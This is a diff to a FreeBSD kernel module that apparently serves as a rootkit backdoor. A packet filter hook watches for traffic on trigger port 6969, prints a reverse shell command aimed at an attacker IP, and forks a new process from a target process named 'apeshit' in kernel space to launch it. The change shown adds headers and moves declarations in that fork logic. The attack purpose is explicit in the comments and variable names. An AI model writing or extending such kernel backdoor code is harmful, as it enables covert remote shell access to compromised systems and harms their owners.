@@ -22,6 +22,8 @@
 #include <sys/libkern.h>  // Kernel-space string functions
 #include <sys/sx.h> // for finding proc
 #include <sys/queue.h> // for finding proc
+#include <sys/lock.h>     // Locking mechanisms
+#include <sys/sched.h>    // Needed for FIRST_THREAD_IN_PROC()
 
 // Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
 #define TRIGGER_PORT 6969
@@ -162,6 +164,15 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
 
+
+
+        // step through sys_fork()
+        struct proc *parent_proc;
+        struct thread *parent_td;
+        struct fork_req fr;
+        struct proc *new_proc;
+        int error, new_pid;
+
         // Find the process "apeshit"
         parent_proc = find_process_by_name(TARGET_PROC);
         if (parent_proc == NULL) {
@@ -170,11 +181,6 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
         }
         // Get the first thread of that process
         parent_td = FIRST_THREAD_IN_PROC(parent_proc);
-
-
-        struct fork_req fr;
-        struct proc *new_proc;
-        int error, new_pid;
 
         bzero(&fr, sizeof(fr));
         fr.fr_flags = RFPROC;
